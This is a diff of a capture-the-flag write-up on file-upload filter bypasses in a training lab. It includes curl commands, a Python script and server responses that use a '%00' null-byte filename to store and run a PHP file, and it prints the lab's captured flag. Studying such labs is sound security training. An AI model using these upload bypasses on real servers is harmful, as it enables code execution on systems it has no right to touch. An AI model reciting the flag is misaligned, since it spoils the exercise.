@@ -608,12 +608,40 @@ grep -oiE '.{80}upload.{90}' file-manager.js
 - `.{80}upload.{80}` – matches the word `upload` **plus 80/90 characters on each side**.  \
 That surrounding context typically contains the endpoint path being built, the `FormData.append("fieldname", file)` call (revealing the *file field name*), and any adjacent validation.
 - **Endpoint**: `upload:document.getElementById("main").getAttribute("data-url")` – so the upload URL is the `data-url` we already saw: **`/api/task1/`**. The POST goes straight there.
-- **Field name**: `r.append("file",e)` — the file is sent under the field name **`file`**. curl must match this exactly.
+- **Field name**: `r.append("file",e)` – the file is sent under the field name **`file`**. curl must match this exactly.
 - **Request**: `r=new FormData` `+` `fetch(l.upload, {...})` → a standard multipart/form-data **POST**
 - **The filter**: the very end shows `allTypes:["image"]`, i.e. a client-side allowed-types list restricted to images. That's the check we bypass.  \
-Note: this validation exists only in the browser JS. The server-side handler at `/api/task1/` is what we're POSTing to directly — skipping the JS means skipping the filter entirely.
+Note: this validation exists only in the browser JS. The server-side handler at `/api/task1/` is what we're POSTing to directly – skipping the JS means skipping the filter entirely.
+
+- alternatively we can prettify the minified code:
+
+```bash
+npx prettier file-manager.js --parser babel > file-manager-pretty.js
+```
+
+
+```js
+        t.jsx(n, {
+          handleUpload: (e, t, a) => {
+            if (l.upload) {
+              const r = new FormData();
+              (r.append("file", e),
+                fetch(l.upload, { method: "POST", body: r })
+                  .then((e) => e.json())
+                  .then((e) => {
+                    e.error ? t(e.error) : (s(e.message), d(), a());
+                  }));
+            } else t("Can't upload. Currently we don't support uploads.");
+          },
+          allFiles: o,
+          setAllFiles: i,
+          allTypes: ["image"],
+        }),
+```
+
 
 We have everything needed. Let's build the PHP payload and upload it in one go.
+
 
 ```bash
 # create php file
@@ -653,5 +681,240 @@ cat 1-flag.txt
 
 git add .
 git commit -m "1-flag.txt"
+git push
+```
+
+
+
+## 2. Special Characters are so special !
+
+After successfully navigating past the client-side restrictions, you're faced with a more formidable challenge: bypassing the server-side validation that scrutinizes the file formats being uploaded.
+
+This task requires you to cleverly use special characters in the file name to deceive the server-side checks, allowing you to upload a file type that is normally restricted.
+Successfully uploading such a file will unveil a hidden `Flag` ⛳️.
+
+
+Target Endpoint: http://[vuln-subdomain].web0x05.hbtn/task2
+
+You will need to use this php command to read the flag: `<?php readfile('FLAG_2.txt') ?>`, FLAG will only be generated if you upload a php file!
+
+**Useful Instructions**
+
+1. Investigate how the server processes file names and extensions. Some servers might strip or ignore certain special characters, altering the file name after processing.
+2. Experiment with adding special characters like spaces, dots, or null bytes (`%00`) in the file extension. For example, attempting to upload a file named `payload.php.jpg` might be blocked, but `payload.php%00.jpg` could bypass the filter if the server improperly handles null bytes.
+3. Utilize tools like Burp Suite to intercept and modify your upload requests, carefully crafting the file names with special characters to test the server's validation logic.
+4. Keep an eye on the server's response to each upload attempt. A successful bypass might not always be explicitly confirmed by the application’s UI. Check for any changes in behavior or new functionalities accessible after your upload.
+
+
+Meanwhile sandbox time out, new sandbox, replace ip in /etc/hosts
+```bash
+swapip 10.42.220.203 10.42.143.173 
+# initiate and check vpn
+ovi
+ovc
+```
+
+---
+
+This one steps up: now the server checks the filename too, and the task title plus the hints tell us the weakness is in **how the server parses special characters** in the name. Same core setup as Task 1 (POST multipart to the API, field name `file`), but a raw `shell.php` will now be rejected. Our job is to find the parsing quirk.
+
+Before we start throwing special characters, let's do this methodically: first establish **what the server rejects**, so we have a baseline error to compare against. We need to see the exact rejection message for a plain `.php` – that message often hints at how it's filtering (extension blocklist? checking the last extension? substring match?).
+
+Let's also confirm the endpoint is the parallel `/api/task2/`. First, a quick check of the task2 page to grab its `data-url`, mirroring what we did before.
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/task2 | grep -oE 'data-url="[^"]*"'
+# data-url="/api/task2/"
+```
+
+Confirmed – the endpoint is `/api/task2/`, exactly parallel to task1. Now let's provoke the server-side filter so we can see how it rejects things. Understanding the rejection is what tells us which special-character trick will work; blindly trying `%00`, spaces, and dots without reading the errors is just guessing.
+
+Let's send a plain `shell2.php` (adapted for FLAG2) and read the response.
+
+```bash
+# create shell2.php for FLAG2
+printf "%s" "<?php readfile('FLAG_2.txt') ?>" > shell2.php
+
+# trust but verify
+cat shell2.php
+# <?php readfile('FLAG_2.txt') ?>
+
+# try upload
+curl -v -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;type=image/png"
+
+# * Host test-s3.web0x05.hbtn:80 was resolved.
+# * IPv6: (none)
+# * IPv4: 10.42.143.173
+# *   Trying 10.42.143.173:80...
+# * Established connection to test-s3.web0x05.hbtn (10.42.143.173 port 80) from 10.8.0.2 port 51202 
+# * using HTTP/1.x
+# > POST /api/task2/ HTTP/1.1
+# > Host: test-s3.web0x05.hbtn
+# > User-Agent: curl/8.19.0
+# > Accept: */*
+# > Content-Length: 230
+# > Content-Type: multipart/form-data; # boundary=------------------------AViEVXiYVT188xEEKPVhFB
+# > 
+# * upload completely sent off: 230 bytes
+# < HTTP/1.1 400 BAD REQUEST
+# < Server: nginx/1.22.1
+# < Date: Mon, 27 Jul 2026 10:31:23 GMT
+# < Content-Type: application/json
+# < Content-Length: 35
+# < Connection: keep-alive
+# < 
+# {"error":"File type not allowed."}
+# * Connection #0 to host test-s3.web0x05.hbtn:80 left intact
+```
+
+There's our baseline: a plain `.php` gets **400 "File type not allowed."** So the server-side filter is active and rejecting based on file type/extension. Now we need to learn how it decides – because the right bypass depends entirely on the parsing flaw.
+
+The task title ("Special Characters are so special!") and hint #1 ("some servers strip or ignore certain special characters, altering the file name after processing") point to a specific class of bug: **the server checks one version of the filename but saves a different one**. It validates the name as-received, but then strips/trims certain characters before writing to disk – so a name that passes validation might get transformed into an executable `.php` on disk.
+
+The most classic version, and the one hint #1 describes almost verbatim, is a **trailing character that gets stripped**. Think `shell.php.` (trailing dot) or `shell.php ` (trailing space) or `shell.php.jpg` variants. The validator sees a "safe-looking" or non-`.php` final extension, accepts it, then the server (or the OS/filesystem) strips the trailing junk, leaving `shell.php`.
+
+Rather than guess which character, let's probe systematically. Let's start with the single most common one that fits hint #1 exactly: a trailing dot after `.php`. On many misconfigured stacks the validator does something like "reject if the extension equals php", and `php.` isn't equal to `php` – but the filesystem/normalization drops the trailing dot on save.
+
+```bash
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;filename=shell.php.;type=image/png"
+# HTTP/1.1 400 BAD REQUEST
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 10:41:58 GMT
+# Content-Type: application/json
+# Content-Length: 35
+# Connection: keep-alive
+# 
+# {"error":"File type not allowed."}
+```
+
+Trailing dot rejected – same 400. Good, that rules out one variant and tells us the filter isn't fooled by a simple trailing dot. Let's keep probing methodically, one character class at a time, reading each response.
+
+Before we spend many requests guessing blindly, though, it's worth being smarter about what the filter is actually doing. Right now we know two things get rejected: `shell.php` and `shell.php.`. The task hints heavily at null bytes (hint #2 literally shows `payload.php%00.jpg`). The null-byte trick works when the server does its type-check on the full string (sees a safe `.jpg` ending → allows it) but a lower layer treats the null byte (`\0`) as a string terminator and truncates the name to `shell.php` when saving. This is the textbook "special character" upload bypass, and it's exactly what the title is nudging us toward.
+
+The subtlety with null bytes over HTTP: you can't just type `%00` into curl's `-F filename=` and have it become a real null byte – curl sends the literal characters `%`, `0`, `0`. We need to inject an **actual `\0` byte** into the `Content-Disposition` filename. Let's do that.
+
+```bash
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ \
+  -F $'file=@shell2.php;filename=shell.php\x00.png;type=image/png'
+
+# HTTP/1.1 400 BAD REQUEST
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 10:48:14 GMT
+# Content-Type: application/json
+# Content-Length: 35
+# Connection: keep-alive
+# 
+# {"error":"File type not allowed."}
+```
+
+- `-F $'...'` – the `$'...'` is **bash ANSI-C quoting**. Inside it, `\x00` is interpreted by bash into a **real null byte (0x00)**, not the literal text `%00` or `\x00`. This is how we smuggle an actual null into the filename field.
+
+- Still 400.
+
+- Rather than continue blind, let's do two cheap, high-information things. First, let's confirm what the server does accept – upload a legit .png-named file. That tells us the allowlist is extension-based and gives us a success baseline to compare against (success message format, stored path pattern). Knowing exactly what a pass looks like sharpens every subsequent attempt.
+
+```bash
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;filename=test.png;type=image/png"
+
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 11:01:18 GMT
+# Content-Type: application/json
+# Content-Length: 63
+# Connection: keep-alive
+# 
+# {"message":"'/static/upload/test.png' uploaded successfully."}
+```
+
+- Same endpoint and `file` field. Our payload bytes are still PHP, but we name it `test.png`.
+- `;filename=test.png` – presents a clean, single .png extension that should sail through an image allowlist.
+
+**Result**
+
+- Content isn't checked at all. We uploaded PHP bytes named `test.png` and it succeeded and stored `/static/upload/test.png`. So the filter is purely **name-based on the extension** – no magic-byte/content sniffing. Our entire problem is making the extension look allowed while the file still executes as PHP.
+- Same storage pattern: `/static/upload/<name>`, and it preserved the name exactly (`test.png` → `test.png`). So whatever filename passes validation is (apparently) what lands on disk – meaning we can't rely on the server stripping something after the check (we tested trailing dot / null byte, both rejected at the check stage).
+
+Let's give a try with this python script.
+
+```py
+#!/usr/bin/env python3
+
+import requests
+
+url = "http://web0x05.hbtn/api/task2/"
+headers = {"Host": "test-s3.web0x05.hbtn"}
+
+payloads = [
+    "shell2.php\x00.png",
+    "shell2.php%00.png",
+]
+
+with open("shell2.php", "rb") as source:
+    content = source.read()
+
+for name in payloads:
+    files = {
+        "file": (
+            name,
+            content,
+            "image/png",
+        )
+    }
+
+    response = requests.post(
+        url,
+        headers=headers,
+        files=files,
+        timeout=10,
+    )
+
+    print(repr(name), "=>", response.status_code, response.text)
+```
+
+
+```bash
+./test2.py
+
+# 'shell2.php\x00.png' => 200 {"message":"'/static/upload/shell2.php.png' uploaded successfully."}
+
+# 'shell2.php%00.png' => 200 {"message":"'/static/upload/shell2.php' uploaded successfully."}
+```
+
+- `shell2.php\x00.png` (a real null byte) → stored as `shell2.php.png`. The server "sanitized" the raw null by... turning the whole thing into `shell2.php.png` (or stripping the null and keeping both extensions). Passes the check, but lands as `.png` – not directly executable, and not what we want.
+- `shell2.php%00.png` (the literal text `%00`) → stored as `shell2.php`! This is the winner. Here's the mechanism: the validator receives the string `shell2.php%00.png`, and its type-check sees the name ends in `.png` → allowed. But then something in the pipeline URL-decodes `%00` into a real null byte, and a lower layer treats that null as a string terminator, truncating the saved name to `shell2.php`. Classic null-byte truncation – except the injection vector is the literal percent-encoded `%00`, decoded server-side, rather than a raw null in the multipart header.
+
+Alternatively uploading the php with curl:
+
+```bash
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;filename=pwn.php%00.png;type=image/png"
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Date: Mon, 27 Jul 2026 13:31:35 GMT
+Content-Type: application/json
+Content-Length: 62
+Connection: keep-alive
+
+{"message":"'/static/upload/pwn.php' uploaded successfully."}
+```
+
+
+We now have our PHP payload sitting at `/static/upload/pwn.php` — real `.php`, and we know from Task 1 that this directory executes PHP. Let's request it and collect the flag.
+
+
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/static/upload/pwn.php
+# f20b1ce7281e892618ce1d4572004c8f
+```
+
+Save and check the flag.
+
+```bash
+echo f20b1ce7281e892618ce1d4572004c8f > 2-flag.txt
+
+cat 2-flag.txt
+
+git add .
+git commit -m "2-flag.txt"
 git push
 ```
